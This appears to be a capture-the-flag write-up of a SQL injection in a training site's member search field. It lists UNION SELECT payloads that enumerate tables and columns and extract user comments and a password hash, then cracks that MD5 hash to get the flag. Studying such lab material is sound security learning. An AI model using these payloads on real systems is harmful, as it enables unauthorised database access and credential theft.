On: ```/?page=member```

### Flaw
The search field is vulnerable to SQLi.

To get all tables with schema: ```1 UNION SELECT TABLE_NAME, TABLE_SCHEMA FROM information_schema.tables```

To get all tables with columns: ```1 UNION SELECT TABLE_NAME, COLUMN_NAME FROM information_schema.columns```

List users with commentaires: ```1 UNION SELECT user_id, Commentaire FROM users```

```Commentaire``` field from user 5 says: ```Decrypt this password -> then lower all the char. Sh256 on it and it's good !```

This vulnerability can be exploited to access/modify/remove data from the database. You could even get admin privileged credentials if they are not encrypted.

### Flag
- Get the countersign for user 5: ```1 UNION SELECT user_id, countersign FROM users```
- ```5ff9d0165b4f92b14994e5c685cdce28``` is the md5 for ```FortyTwo```
- Lowercase it: ```fortytwo```
- Sha256 on it to get the flag
